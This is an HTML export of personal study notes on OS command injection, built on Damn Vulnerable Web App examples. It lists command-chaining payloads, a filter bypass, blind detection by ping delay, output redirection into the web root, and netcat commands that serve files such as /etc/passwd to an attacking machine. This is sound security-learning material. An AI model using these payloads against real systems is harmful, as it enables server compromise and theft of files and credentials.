<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>OS Command Injection</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>
<body>
<div class='page'><strong><h1># OS Command Injection</h1></strong><br />• <a href="https://portswigger.net/web-security/os-command-injection">https://portswigger.net/web-security/os-command-injection</a><br />• <a href="https://www.contextis.com/en/blog/data-exfiltration-via-blind-os-command-injection">https://www.contextis.com/en/blog/data-exfiltration-via-blind-os-command-injection</a><br />• <a href="https://www.hackingarticles.in/beginner-guide-os-command-injection/">https://www.hackingarticles.in/beginner-guide-os-command-injection/</a><br />• <a href="https://github.com/fuzzdb-project/fuzzdb/tree/master/attack/os-cmd-execution">https://github.com/fuzzdb-project/fuzzdb/tree/master/attack/os-cmd-execution</a> ← dank<br /><br />OS Command Injection is a web vulnerability where an attacker can execute commands on the host OS on which the web server is running. This can quite easily lead to total system compromise. <br /><br />The commands will execute within the context that the webserver is running.<br />For example, the web server is running as <code>www-data</code>.<br />Any commands you manage to inject and execute will run with the permissions of that <code>www-data</code> user.<br /><br /><strong><h2>## Commands</h2></strong><br /><strong><h3>### PHP</h3></strong><br />PHP functions to execute system commands:<br /><code>system(&#39;whoami&#39;);</code><br /><code>shell_exec(&#39;whoami&#39;);</code><br /><code>exec(&#39;whoami&#39;);</code><br /><br /><strong><h3>### Linux</h3></strong><br /><code>cat /etc/passwd</code><br /><br /><strong>#### Chain Injected Command to Original Command</strong><br /><code>original_cmd_by_server &amp; whoami</code><br /><code>original_cmd_by_server &amp;&amp; whoami</code><br /><code>original_cmd_by_server | whoami</code><br /><code>original_cmd_by_server || whoami<br />original_cmd_by_server; whoami</code> <code><br />original_cmd_by_server0x0a whoami<br />original_cmd_by_server\n whoami<br /><br /></code><strong>#### Inside a command</strong><code><br />original_cmd_by_server `cat /etc/passwd`<br />original_cmd_by_server $(cat /etc/passwd)</code><br /><br /><strong><h3>### Windows</h3></strong><br /><code>whoami</code><br /><code>original_cmd_by_server &amp; whoami</code><br /><code>original_cmd_by_server &amp;&amp; whoami</code><br /><code>original_cmd_by_server | whoami</code><br /><code>original_cmd_by_server || whoami</code><br /><br /><strong><h2>## Code Filtering</h2></strong><br />To prevent users from injecting code but whilst still allowing to give an input, web developers sometimes use code filtering to filter out dangerous characters like: <code>;</code> <code>&amp;</code> <code>&#39;</code> etc., <br /><br />All of the examples below from DVWA - Damn Vulnerable Web App.<br /><br /><strong><h3>### No input filtering</h3></strong><br />An example of command injection in PHP with no input filtering looks like this:<br /><br /><div class="codebox"><div class="codebox">//&nbsp;Take&nbsp;the&nbsp;user&nbsp;input&nbsp;from&nbsp;the&nbsp;ip&nbsp;parameter&nbsp;in&nbsp;the&nbsp;POST&nbsp;request&nbsp;and&nbsp;stores&nbsp;it&nbsp;in&nbsp;$target<br />$target&nbsp;=&nbsp;$_REQUEST[&nbsp;&#39;ip&#39;&nbsp;];<br /><br />//&nbsp;Execute&nbsp;the&nbsp;ping&nbsp;command&nbsp;using&nbsp;the&nbsp;contents&nbsp;of&nbsp;$target<br />$cmd&nbsp;=&nbsp;shell_exec(&nbsp;&#39;ping&nbsp;&nbsp;-c&nbsp;4&nbsp;&#39;&nbsp;.&nbsp;$target&nbsp;);&nbsp;</div></div><br /><br />Because there&#39;s no input filtering, you can execute multiple commands on 1 line using different operators in bash syntax.<br /><br />Viable code injection here might look like this (untested on DVWA):<br /><code>; whoami</code><br />which would translate to<br /><code>ping -c 4; whoami</code><br /><br /><strong><h3>### Mild input filtering</h3></strong><br />An example with mild input filtering:<br /><br /><div class="codebox"><div class="codebox">//&nbsp;Get&nbsp;input<br />$target&nbsp;=&nbsp;$_REQUEST[&nbsp;&#39;ip&#39;&nbsp;];<br /><br />//&nbsp;Set&nbsp;blacklist<br />$substitutions&nbsp;=&nbsp;array(<br />&nbsp;&nbsp;&nbsp;&nbsp;&#39;&amp;&amp;&#39;&nbsp;=&gt;&nbsp;&#39;&#39;,<br />&nbsp;&nbsp;&nbsp;&nbsp;&#39;;&#39;&nbsp;&nbsp;=&gt;&nbsp;&#39;&#39;,<br />);<br /><br />//&nbsp;Remove&nbsp;any&nbsp;of&nbsp;the&nbsp;charactars&nbsp;in&nbsp;the&nbsp;array&nbsp;(blacklist).<br />$target&nbsp;=&nbsp;str_replace(&nbsp;array_keys(&nbsp;$substitutions&nbsp;),&nbsp;$substitutions,&nbsp;$target&nbsp;);<br /><br />//&nbsp;Execute&nbsp;the&nbsp;ping&nbsp;command<br />$cmd&nbsp;=&nbsp;shell_exec(&nbsp;&#39;ping&nbsp;&nbsp;-c&nbsp;4&nbsp;&#39;&nbsp;.&nbsp;$target&nbsp;);</div></div><br /><br />When there&#39;s input filtering like this, your only option is to try all the different operators  and hope they haven&#39;t blacklisted them all.<br /><br />Viable code injection here might look like this (untested on DVWA):<br />• <code>| whoami</code><br />• <code>|| whoami</code><br />• etc.<br /><br /><strong><h3>### Total input filtering</h3></strong><br />An example where all operators are filtered.<br /><br /><div class="codebox"><div class="codebox">//&nbsp;Get&nbsp;input<br />$target&nbsp;=&nbsp;trim($_REQUEST[&nbsp;&#39;ip&#39;&nbsp;]);<br /><br />//&nbsp;Set&nbsp;blacklist<br />$substitutions&nbsp;=&nbsp;array(<br />&nbsp;&nbsp;&nbsp;&nbsp;&#39;&amp;&#39;&nbsp;&nbsp;=&gt;&nbsp;&#39;&#39;,<br />&nbsp;&nbsp;&nbsp;&nbsp;&#39;;&#39;&nbsp;&nbsp;=&gt;&nbsp;&#39;&#39;,<br />&nbsp;&nbsp;&nbsp;&nbsp;&#39;|&nbsp;&#39;&nbsp;=&gt;&nbsp;&#39;&#39;,<br />&nbsp;&nbsp;&nbsp;&nbsp;&#39;-&#39;&nbsp;&nbsp;=&gt;&nbsp;&#39;&#39;,<br />&nbsp;&nbsp;&nbsp;&nbsp;&#39;$&#39;&nbsp;&nbsp;=&gt;&nbsp;&#39;&#39;,<br />&nbsp;&nbsp;&nbsp;&nbsp;&#39;(&#39;&nbsp;&nbsp;=&gt;&nbsp;&#39;&#39;,<br />&nbsp;&nbsp;&nbsp;&nbsp;&#39;)&#39;&nbsp;&nbsp;=&gt;&nbsp;&#39;&#39;,<br />&nbsp;&nbsp;&nbsp;&nbsp;&#39;`&#39;&nbsp;&nbsp;=&gt;&nbsp;&#39;&#39;,<br />&nbsp;&nbsp;&nbsp;&nbsp;&#39;||&#39;&nbsp;=&gt;&nbsp;&#39;&#39;,<br />);<br /><br />//&nbsp;Remove&nbsp;any&nbsp;of&nbsp;the&nbsp;charactars&nbsp;in&nbsp;the&nbsp;array&nbsp;(blacklist).<br />$target&nbsp;=&nbsp;str_replace(&nbsp;array_keys(&nbsp;$substitutions&nbsp;),&nbsp;$substitutions,&nbsp;$target&nbsp;);<br /><br />//&nbsp;Determine&nbsp;OS&nbsp;and&nbsp;execute&nbsp;the&nbsp;ping&nbsp;command.<br />$cmd&nbsp;=&nbsp;shell_exec(&nbsp;&#39;ping&nbsp;&nbsp;-c&nbsp;4&nbsp;&#39;&nbsp;.&nbsp;$target&nbsp;);</div></div><br /><br />The vulnerability above is that there&#39;s a space in the filter for <code>|</code> - <code>&#39;| &#39; =&gt; &#39;&#39;,</code><br />meaning that you could achieve command injection by using <code>|</code> and not putting a space - <code>|cat /etc/passwd</code><br /><br />The harsh reality is that you&#39;re probably not going to find any command injection possibilities if all the inputs are filtered.<br /><br /><strong><h2>## Blind OS Command Injection</h2></strong><br />Non-blind OS Command Injection is where the the results of your injected command are printed to the web page.<br />Blind injection is where the results of your injected command aren&#39;t printed out to you.<br /><br /><strong><h3>### Detecting Blind Injection</h3></strong><br /><strong>#### Time Delay</strong><br />To detect blind command injection, you can use a command that will trigger a time delay in order to confirm whether the command was executed or not based on the time that the application takes to respond.<br /><br /><code>ping</code> is perfect for this.<br />It lets you specify the number of ICMP packets to send, and therefore the time taken for the command to run.<br /><br /><code>; ping -c 10 127.0.0.1 &amp;</code><br />This will cause the application to ping localhost for 10 seconds.<br />If the web app takes 10 seconds to respond after injecting your command, you&#39;ve found a command injection vulnerability.<br /><br /><strong><h3>### Exploiting Blind Injection<br /></h3></strong>Because you can&#39;t see the output of the command injection, you need to find a way to redirect the results and see the output.<br />Or you could just try getting a shell.<strong><h3><br /><br /></h3></strong><strong>#### Redirect Output</strong><br />You can redirect the output of your injected command into a file in the current web directory.<br /><br /><code>; whoami &gt; /var/www/html/website/whoami.txt</code><br />Now read the output of the command by visitng - <code>website.com/whoami.txt</code><br /><br />This is fairly unreliable as <br />1) you have to write to a valid directory in the website <br />2) have write permissions to that directory<br />3) not have <code>&gt;</code> blocked by code filtering<br /><br /><strong>#### Read File</strong><br />On a web app, use command injection to start a netcat listener and serve the file you want to read <br />Linux - <code>nc –lvnp 4445 &lt; /var/www/html/dvwa/instructions.php</code><br />Windows - <code>type index.html  | nc -L -p 4445</code><br /><br />On attacking machine, connect to server on listening port to retrieve the file<br /><code>nc 192.168.1.82 4445</code><br /><br /><strong>#### Read Output of Command</strong><br />Execute the command and pipe it to netcat (could listen on victim or send to attacker, either should work)<br />Linux - <code>cat /etc/passwd | nc –lvnp 4445</code></div>
</body>
</html>
